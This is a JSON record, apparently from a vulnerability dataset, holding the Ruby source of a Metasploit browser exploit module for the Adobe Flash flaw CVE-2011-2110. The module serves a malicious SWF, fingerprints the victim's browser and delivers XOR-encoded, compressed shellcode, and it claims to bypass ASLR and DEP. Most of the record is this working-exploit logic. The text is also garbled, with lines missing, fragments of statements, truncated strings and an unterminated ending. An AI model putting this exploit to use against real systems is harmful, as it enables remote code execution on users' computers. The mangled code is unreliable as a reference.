{
    "text": "vul_name : Adobe Flash Player AVM Verification Logic Array Indexing Code Execution ， vul_cve : CVE-2011-2110 ， vul_poc :  ，  #  $ Id $  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = GreatRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， super ( update_info ( info ,  ， 'Name' => 'Adobe Flash Player AVM Verification Logic Array Indexing Code Execution' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23 ， and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification ， logic. This results in unsafe JIT ( Just-In-Time ) code being executed. This is the same ， vulnerability that was used for attacks against Korean based organizations. ， Specifically , this issue occurs when indexing an array using an arbitrary value ,  ， memory can be referenced and later executed. Taking advantage of this issue does not rely ， on heap spraying as the vulnerability can also be used for information leakage. ， Currently this exploit works for IE6 , IE7 , IE8 , Firefox 10.2 and likely several ， other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and ， is very reliable. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'mr_me <steventhomasseeley [ at ] gmail.com>' ,  # msf exploit ,  ， 'Unknown' # malware version seen used in targeted attacks ，  ]  ,  ， 'Version' => ' $ Revision $ ' ,  ， ' ，  [  ，  [ 'CVE' , '2011-2110' ]  ,  ，  [ 'OSVDB' , '48268' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultOptions' => ， { ， 'EXITFUNC' => 'process' ,  ， 'HTTP : compression' => 'gzip' ,  ， 'HTTP : chunked' => true ,  ， 'InitialAutoRunScript' => 'migrate -f' ， } ,  ， 'Payload' => ， { ， 'Space' => 2000 ,  ， 'BadChars' => \"\\x00\" ,  ， 'DisableNops' => true ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  ]  ,  ， 'DisclosureDate' => 'Jun 21 2012' ,  ， 'DefaultTarget' => 0 )  ， end ， def exploit ，  # src for the flash file : external/source/exploits/CVE-2011-2110/CVE-2011-2110.as ，  # full aslr/dep bypass using the info leak as per malware ， path = File.join ( Msf : Config.install_root , \"data\" , \"exploits\" , \"CVE-2011-2110.swf\" )  ， fd = File.open ( path , \"rb\" )  ，  @ swf = fd.read ( fd.stat.size )  ， fd.close ， super ， end ， def check_dependencies ， use_zlib ， end ，  # If the user is already specified by the user , we'll just use that ， elsif agent = ~ /Firefox/ ， end ， end ， agent = request.headers [ 'User-Agent' ]  ， my_target = get_target ( agent )  ，  # Avoid the attack if the victim doesn't have the same setup we're targeting ， print_error ( \" # {cli.peerhost} :  # {cli.peerport} - Browser not supported :  # {agent.to_s}\" )  ， send_not_found ( cli )  ， end ， xor_byte = 122 ， trigger = @ swf ， trigger_file = rand_text_alpha ( rand ( 6 ) +3 ) + \".swf\" ， code = rand_text_alpha ( rand ( 6 ) +3 ) + \".txt\" ， sc = Zlib : Deflate.deflate ( payload.encoded )  ， shellcode = \" ， sc.each_byte do | c |  ， shellcode ( xor_byte ^ c )  ， end ， uri = ( datastore [ 'SSL' ]  ) ? \" : \" ， uri ( datastore [ 'SRVHOST' ] = '0.0.0.0' ) ? Rex : Socket.source_address ( '50.50.50.50' )  : datastore [ 'SRVHOST' ]  )  ， uri \" :  # {datastore [ 'SRVPORT' ] } # {get_resource (  ) }/ # {code}\" ， bd_uri = Zlib : Deflate.deflate ( uri )  ， uri = \" ， bd_uri.each_byte do | c |  ， uri ( xor_byte ^ c )  ， end ， bd_uri = uri.unpack ( \"H * \" )  [ 0 ]  ， obj_id = rand_text_alpha ( rand ( 6 ) +3 )  ， print_status ( \"Sending malicious swf\" )  ， send_response ( cli , trigger , { 'Content-Type' => 'application/x-shockwave-flash' } )  ， end ， print_status ( \"Sending payload\" )  ， send_response ( cli , shellcode , { 'Content-Type' => 'text/plain' } )  ， end ， html = -EOS",
    "time": "2012.06.20"
}